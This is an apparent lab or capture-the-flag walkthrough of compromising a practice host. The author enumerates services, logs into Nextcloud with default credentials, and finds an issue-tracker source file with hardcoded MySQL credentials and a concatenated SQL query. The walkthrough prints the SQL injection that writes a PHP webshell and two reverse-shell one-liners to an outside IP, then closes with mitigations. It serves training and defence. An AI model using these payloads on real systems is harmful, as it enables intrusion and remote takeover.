## Introduction

In this walkthrough, I found a Nextcloud instance hosted as one of the web applications. I was able to log in using default credentials (`admin:admin`). Within the dashboard, I discovered a ZIP file containing the source code of another application—an issue tracker. Reviewing the code and configuration, I found MySQL credentials and observed how the web application communicated with the database. I exploited the vulnerable query logic to inject a payload that wrote a webshell to the web root. Accessing this shell through the browser, I upgraded it to a reverse shell, which immediately provided root access.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

## Web

### Port 17445

Version - Apache Tomcat (language: en)

![image.png](image%203.png)

```bash
**feroxbuster -u http://$IP:17445/ -w /usr/share/wordlists/dirb/common.txt -C 403,404,400**
```

After registering and logging into app I see 2 other users:

### Port 30455

### Port 50080

```bash
**feroxbuster -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -C 403,404,400**
```

```bash
gobuster dir -u http://$IP:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42 -b 400,403,404
```

**API Enumeration**

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://$IP:8080/FUZZ/
```

```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

**pattern file**

```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

**Vhost Fuzzing**

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:<port>/ -H 'Host: FUZZ.academy.htb'
```

## Exploitation

Navigating to `cloud` directory I see login panel for `Nextcloud` app.

![image.png](image%2012.png)

Using credentials `admin`:`admin` I was able to login.

Among files I just found `issuetracker.zip` interesting.

Grepping for `pass` inside `src` directory I see some password in file:

```bash
grep -r pass
```

![image.png](image%2013.png)

```java
@GetMapping("/issue/checkByPriority")
	public String checkByPriority(@RequestParam("priority") String priority, Model model) {
		// 
		// Custom code, need to integrate to the JPA
		//
	    Properties connectionProps = new Properties();
	    connectionProps.put("user", "issue_user");
	    connectionProps.put("password", "ManagementInsideOld797");
        try {
			conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
		    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
            System.out.println(query);
		    Statement stmt = conn.createStatement();
		    stmt.executeQuery(query);

        } catch (SQLException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		
        // TODO: Return the list of the issues with the correct priority
		List<Issue> issues = service.GetAll();
		model.addAttribute("issuesList", issues);
		return "issue_index";
        
	}
	
```

I see that it connects using these credentials to local `MySQL` server, what we can do is to write some webshell in a directory where we can access it. Among valid priorities I see `Normal`. As we know `phpinfo.php` we can see the `DOCUMENT_ROOT`:

![image.png](image%2014.png)

That means if I write a web shell it will be under `30445` port.

```java
Normal' UNION SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE '/srv/http/webshell.php'-- -
```

URL-encoding in Burp didn’t work properly that’s why I tried with different websites and found this working:

[url-encode-decode](https://www.url-encode-decode.com/)

As you can see it returned messages and and also executed command.

![image.png](image%2015.png)

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.226 50080 >/tmp/f #didn't work
bash -i >& /dev/tcp/192.168.45.226/50080 0>&1 #burp-url-encoded worked
```

## Credentials

```bash
issue_user:ManagementInsideOld797 #pass for MySQL
```

## Mitigation

- Change or disable default credentials immediately after installation.
- Avoid exposing sensitive files such as source code or backups to authenticated or unauthenticated users.
- Sanitize all database inputs to prevent injection attacks; use parameterized queries.
- Run web applications as low-privileged users, not as `root`.
- Monitor file write operations under the web root and restrict write permissions to essential services only.
